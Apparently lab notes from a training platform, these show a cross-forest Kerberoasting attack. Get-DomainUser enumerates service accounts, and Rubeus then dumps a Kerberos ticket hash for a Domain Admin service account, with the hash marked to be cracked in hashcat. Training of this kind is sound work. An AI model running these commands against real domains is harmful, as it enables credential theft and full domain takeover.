@@ -1,1 +1,51 @@
+Enumerating Accounts for Associated SPNs Using Get-DomainUser
 
+PS SYNTAX: PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+samaccountname
+--------------
+krbtgt
+mssqlsvc
+
+
+Enumerating the mssqlsvc Account
+
+PS Syntax: PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+
+samaccountname memberof
+-------------- --------
+mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+
+Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+
+
+PS Syntax: PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : mssqlsvc
+[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+[*] SamAccountName         : mssqlsvc
+[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
+[*] PwdLastSet             : 3/24/2022 12:47:52 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
+
+Voila crack hash with hashcat and we have leveraged access to fully control two domains. 
